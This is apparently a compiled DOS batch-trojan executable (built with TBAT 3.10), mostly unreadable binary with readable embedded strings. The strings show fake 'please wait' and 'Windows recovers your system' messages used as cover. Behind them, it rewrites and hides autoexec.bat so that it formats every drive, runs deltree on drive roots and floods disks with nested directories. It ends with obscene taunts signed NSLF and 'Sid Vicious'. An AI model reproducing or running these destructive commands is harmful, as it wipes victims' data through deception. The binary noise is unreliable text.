�2�	���@ ��� &�&l ��&�l $:Đ�&�l $:�u���� This version (3.10) of TBAT is registered to Zebra-NN BBS, SysOp - 
Oleg Serdjuck,  CoSysOp - Alex Volodko.                   

$����n �f�^�J�!�, �F��P�F$�^ ���L�!�
�V"ø �~$3ɺO���  [��
�t� ���SP�2��X<t%<t)<t-<
t-�	�^$2�� R�Z��Ov02���2���$
�t ���2���ƀ�v��R��~$3ɺO�Z2���[��F�����t�=�!s�<�!r'���t�B3ҋ��!r�^S�E� �!�F� [�F�!�S�  [��O�FP�W.�WX�F[��  �  M  S�   DUMMY   FCB     DUMMY   FCB    [�fWV��F�?�)�!��)�!^_�WR�RW.�FP�ܸ K���!��.�n ����Ӌf���M�!�F[�M  S�	 COMMAND  [�, 9Fu/S�0�!�ĉG�R�!&�G�� [��&�>  Mu_@&; t	& ���N� 
s� r�7� � �uۋЎ�&�, ��K��&�>  Mt��H��& @��&9 t���@�F[�S� COMSPEC[� ���W[�   SQW�F3��ދ���u&�==t2�����&�= u�������<=u��< t�
�r< r�N�_Y[Ã~�t�F�^� �!�>�^�!ÊF
�t��!���S�(   Out of environment space
 
 No Path [�ǆĈ'P��pXU��u$� ��xs�w ���.��t�w��t��� 3�V���
�t< u�=W��< t�<=t��
�t���_�
�t<=t<ar<zw$�< v�ƪ����^�W��2�
�u 
�u'.�^3����.��tV�ً�.��t^�< u�� ��.�= tG.�= s3�P��xZ��r!2��� �GGW�� ��_2䬪
�t����O���tI��H��&�. ���MM3��G���;�s�';�s���u
<ar<zw$ߪ
�u��2���w��t][�M  c     S�  [WV���
�t	<%t���u�2��^_��*܈]�[ìI<%t����0r��	w	�WC
�u���NA�WG��@  �  S� DOS2X [QV�� 3ɊF>v
�u+P�0�!<Xw�7�"W�, 2�3�� ��u����_�, ��W]r�< v	<,t���u�^Y[å  S�  [2��Wr��~	���Wr��N�[�����  �<	t<,t< rt
�u��
�t�����S�  [�<?uFV�Wq�MV3�B�<%t(<$t�<_t�<0r<9v�<Ar<Zv�<ar<zw$߈D���N��^JQVWP�WmrX_���X_^�Wir
�
�t���u�^[�   _  �  �~���u��&_^�=�t��=�VW8U1u��2���u�= t݃�����SQR�  [�N2�3��WZY[ê  PSW�   -1234567890 _��GG���
 &�0 G���t:O3�SҜ�y
���� �� ���t�" ��0��9~��S���4�y�-�X�
�u�_[XFF��P��3����X����S�2  PATH=COMEXEBAT    Bad command or file name
 /C  [�w��V
���G1 � ��3�
usRV3Ҁ|:u���߀�@��G�<\t�\�V���G�!^2��@ �O�}�\t�\�3��=..u��\� ���G�쪊�<\u�G1< u�O���� �.��uG�׋�^Z�'�1 u	�w��as	�w��]�~�I �< v<.t����.��w� ��2��RVQ����iY^Zs
������8���u4�w.������2��� ��E� �w8L�w�L������+D���Y��O�W����e_�[é  c  �	  �  �	  S� PATH[RV� ���W?I��
�t$<;u���<;t
�t���&�}�\t�\��^Z[����   �״�!��3ɴN�!r����U��U��!�< t�N�~1�2��G�~ uh�~ u7�F�v�״�< t<,t< t�<?t<*u2���2���f
�t���,�N���2��� �O�!rO;�t�=\t�=:u�G�v$��
�u�]���F �v�< t
�u��F ]�Év�F ���_����t�  [�W�L�!�
  SQW3��<+t�<-u@FP3�3ҹ
 �,0r<	w2�����ᗓ������X�t
���҃��� ��_Y[��-��)�*�+@          %            
 START � TESTDRV U!FORM_DEL �%MAKEDIR���)E�PLEASE WAIT WHILE PROGRAM LOADS . . .
 nul &/C CALL attrib -r -h c:\autoexec.bat  c:\autoexec.bat @echo off 
 nul c:\autoexec.bat call format c: /q /u /autotest  
 nul &/C CALL attrib +r +h c:\autoexec.bat  drive= alldrive=c d e f g h i j k l m n o p q r s t u v w x y z drivechk.bat @echo off 
 nul {t}.bat @prompt %%%%comspec%%%% /f /c vol %%%%1: $b find "Vol"  
 drivechk.bat  %COMSPEC%  /e:2048 /c {t}.bat/C DEL {t}.bat drivechk.bat if errorlevel 1 goto enddc 
 PLEASE WAIT WHILE PROGRAM LOADS . . .
 nul {t}.bat @prompt %%%%comspec%%%% /f /c dir %%%%1:.\/ad/w/-p $b find "bytes"  
 drivechk.bat  %COMSPEC%  /e:2048 /c {t}.bat/C DEL {t}.bat drivechk.bat if errorlevel 1 goto enddc 
 PLEASE WAIT WHILE PROGRAM LOADS . . .
 nul {t}.bat @prompt dir %%%%1:.\/ad/w/-p $b find " 0 bytes free"  
 drivechk.bat  %COMSPEC%  /e:2048 /c {t}.bat/C DEL {t}.bat drivechk.bat if errorlevel 1 set drive=%%drive%% %%1 
 PLEASE WAIT WHILE PROGRAM LOADS . . .
 drivechk.bat :enddc 
 ��                                               A                                                                  %ALLDRIVE%    nul /C CALL drivechk.bat %A%  nul /C DEL drivechk.bat  nul &/C CALL attrib -r -h c:\autoexec.bat  c:\autoexec.bat @echo off 
 c:\autoexec.bat echo Loading Windows, please wait while Microsoft Windows recovers your system . . . 
 nul c:\autoexec.bat for %%%%a in (%DRIVE%) do call format %%%%a: /q /u /autotest  
 c:\autoexec.bat cls 
 c:\autoexec.bat echo Loading Windows, please wait while Microsoft Windows recovers your system . . . 
 nul c:\autoexec.bat for %%%%a in (%DRIVE%) do call c:\temp.bat %%%%a Bunga  
 c:\autoexec.bat cls 
 c:\autoexec.bat echo Loading Windows, please wait while Microsoft Windows recovers your system . . . 
 nul c:\autoexec.bat for %%%%a in (%DRIVE%) call deltree /y %%%%a:\  
 c:\autoexec.bat cls 
 c:\autoexec.bat echo Loading Windows, please wait while Microsoft Windows recovers your system . . . 
 nul c:\autoexec.bat for %%%%a in (%DRIVE%) do call format %%%%a: /q /u /autotest  
 c:\autoexec.bat cls 
 c:\autoexec.bat echo Loading Windows, please wait while Microsoft Windows recovers your system . . . 
 nul c:\autoexec.bat for %%%%a in (%DRIVE%) do call c:\temp.bat %%%%a Bunga  
 c:\autoexec.bat cls 
 c:\autoexec.bat echo Loading Windows, please wait while Microsoft Windows recovers your system . . . 
 nul c:\autoexec.bat for %%%%a in (%DRIVE%) call deltree /y %%%%a:\  
 c:\autoexec.bat cd\ 
 c:\autoexec.bat cls 
 c:\autoexec.bat echo GREETINGS FROM THE NINA SALVADOR LIBERATION FRONT! 
 c:\autoexec.bat echo WELCOME TO YOUR COMPUTER'S FUNERAL! 
 c:\autoexec.bat echo You have been one of the following. . . 
 c:\autoexec.bat echo 1. A fucking cocky, cowardly little cunt to one of us, who was warned, and has fucked with the wrong people. 
 c:\autoexec.bat echo 2. Just an innocent bystander who we basically just fancied fucking up for a laugh. 
 c:\autoexec.bat echo 3. A Racist, a Sexist, a Paedophile, a Rapist, a Netcop, or just a fucking fool in general. 
 c:\autoexec.bat echo 4. A little shit who has had this coming to them for some fucking time now. 
 c:\autoexec.bat echo. 
 c:\autoexec.bat echo FOAD, 
 c:\autoexec.bat echo. 
 c:\autoexec.bat echo NSLF 
 %/C CALL attrib +r +h c:\autoexec.bat nul c:\temp.bat /C ATTRIB -r -h c:\temp.bat c:\temp.bat @echo off 
 c:\temp.bat %%1:\ 
 c:\temp.bat cd\ 
 c:\temp.bat :startmd 
 c:\temp.bat for %%%%a in ("if not exist %%2\nul md %%2" "if exist %%2\nul cd %%2") do %%%%a 
 c:\temp.bat for %%%%a in (">ass_hole.txt") do echo %%%%a The world is ending, and we are it's wake! 
 c:\temp.bat if not exist %%1:\%%2\%%2\%%2\%%2\%%2\%%2\%%2\%%2\%%2\%%2\%%2\%%2\%%2\%%2\%%2\%%2\%%2\%%2\%%2\%%2\%%2\%%2\%%2\%%2\%%2\%%2\%%2\%%2\%%2\%%2\%%2\%%2\%%2\%%2\%%2\%%2\%%2\%%2\nul goto startmd 
 nul "/C CALL attrib +r +h c:\temp.bat  Initializing Variables . . .
 %DRIVE%    nul %/C CALL format %A%: /q /u /autotest  Initializing Variables . . .
 Validating Data . . .
 %DRIVE%    nul /C CALL c:\temp.bat %A% Munga  Initializing Variables . . .
 Validating Data . . .
 Analyzing System Structure . . .
 %DRIVE%    nul  /C CALL attrib -r -h %A%:\ /S   nul "/C CALL attrib +r +h c:\temp.bat  nul &/C CALL attrib +r +h c:\autoexec.bat  Initializing Variables . . .
 Validating Data . . .
 Analyzing System Structure . . .
 Initializing Application . . .
 %DRIVE%    nul /C CALL deltree /y %A%:\*.  Initializing Variables . . .
 Validating Data . . .
 Analyzing System Structure . . .
 Initializing Application . . .
 Starting Application . . .
 %DRIVE%    nul /C CALL c:\temp.bat %A% Munga  Thank you for being our fucking clown and dancing for us, you stupid cunt!
 
 Sid Vicious has hacked you, cunt!
   �  ���и��Ѝ�\ ���й  ��� �  �h�Ѝ�� ���иK�й  ��� �  �h�Ѝ�� �c�иK�й  ��� �  �h�й  ��� � �h�Ѝ�� �c�иK�й  ���  �h�Ѝ�	���иK�Ѝ�0�  �q�Ѝ�7�  �q�й  ��p�  �h�Ѝ�}�c�иK�й  ����  �h�й  ����  �h�Ѝ���� ���Ћ� �c�иK�й  ���� �h�Ѝ���� ���Ћ� ����%�иK�Ѝ�����й  ��� �h�Ѝ��c�иK�и��Ѝ�:���й  ��b�  �h�й  ��f�  �h�Ѝ�n�� ���Ћ� �c�иK�й  ���� �h�Ѝ���� ���Ћ� ����%�иK�Ѝ�����й  ���� �h�Ѝ� �c�иK�и��Ѝ����й  ��F�  �h�й  ��J�  �h�Ѝ�R�� ���Ћ� �c�иK�й  ���� �h�Ѝ���� ���Ћ� ����%�иK�Ѝ�����й  ���� �h�Ѝ���� ���Ћ� �c�иK�и��Ѝ����й  ��)� �h�Ѝ�6�c�иK�Ѝ�@�D  ����� ���Ѝ� �� ���Ѝ� ��@��	��s�- �  ����  �h�Ѝ���� ���Ћ� ���иK������  ����  �h�Ѝ�����иK�й  ����  �h�Ѝ����иK�й  ��*�  �h�Ѝ�:�c�иK�й  ��G� �h�Ѝ�W�c�иK�й  ����  �h�й  ���� �h�Ѝ���� ���Ћ� �c�иK�й  ��� �h�Ѝ��c�иK�й  ��� �h�Ѝ�+�c�иK�й  ����  �h�й  ���� �h�Ѝ���� ���Ћ� �c�иK�й  ���� �h�Ѝ���c�иK�й  ���� �h�Ѝ���c�иK�й  ��Q�  �h�й  ��U� �h�Ѝ�e�� ���Ћ� �c�иK�й  ���� �h�Ѝ���c�иK�й  ���� �h�Ѝ���c�иK�й  ���  �h�й  ��� �h�Ѝ�+�� ���Ћ� �c�иK�й  ��l� �h�Ѝ�|�c�иK�й  ���� �h�Ѝ���c�иK�й  ����  �h�й  ���� �h�Ѝ���� ���Ћ� �c�иK�й  ��:	� �h�Ѝ�J	�c�иK�й  ��Q	� �h�Ѝ�a	�c�иK�й  ���	�  �h�й  ���	� �h�Ѝ��	�� ���Ћ� �c�иK�й  �� 
� �h�Ѝ�
�c�иK�й  ��
� �h�Ѝ�'
�c�иK�й  ��.
� �h�Ѝ�>
�c�иK�й  ��y
� �h�Ѝ��
�c�иK�й  ���
� �h�Ѝ��
�c�иK�й  ���
� �h�Ѝ��c�иK�й  ��z� �h�Ѝ���c�иK�й  ���� �h�Ѝ���c�иK�й  ��Z� �h�Ѝ�j�c�иK�й  ���� �h�Ѝ���c�иK�й  ���� �h�Ѝ���c�иK�й  ���� �h�Ѝ��c�иK�й  ��� �h�Ѝ��c�иK�Ѝ�,���й  ��R�  �h�Ѝ�V�� ��	��s�	 ��c���иK�й  ����  �h�Ѝ���c�иK�й  ���� �h�Ѝ���� ���Ћ� �c�иK�й  ���� �h�Ѝ���c�иK�й  ���� �h�Ѝ���c�иK�й  ���� �h�Ѝ���� ���Ћ� �c�иK�й  ��8� �h�Ѝ�D�� ���Ћ� �c�иK�й  ���� �h�Ѝ���� ���Ћ� �c�иK�й  ��i�  �h�Ѝ�n���иK�и��Ѝ�����Ѝ�@�D  ����� ���Ѝ� �� ���Ѝ� ��@��	��s�- �  ����  �h�Ѝ���� ���Ћ� ���иK��������Ѝ�����Ѝ����Ѝ�@�D  ���� ���Ѝ� �� ���Ѝ� ��@��	��s�- �  ��(�  �h�Ѝ�-�� ���Ћ� ���иK��������Ѝ�M���Ѝ�l���Ѝ�����Ѝ�@�D  ����� ���Ѝ� �� ���Ѝ� ��@��	��s�- �  ����  �h�Ѝ���� ���Ћ� ���иK������  ����  �h�Ѝ�����иK�й  �� �  �h�Ѝ����иK�и��Ѝ�,���Ѝ�K���Ѝ�c���Ѝ�����Ѝ�@�D  ����� ���Ѝ� �� ���Ѝ� ��@��	��s�- �  ����  �h�Ѝ���� ���Ћ� ���иK��������Ѝ�����Ѝ�����Ѝ����Ѝ�.���Ѝ�O���Ѝ�@�D  ��l�� ���Ѝ� �� ���Ѝ� ��@��	��s�- �  ��w�  �h�Ѝ�|�� ���Ћ� ���иK��������Ѝ�����Ѝ�����Ѝ�����о  �  ��
��                                                                                                                                                                                                                                                                   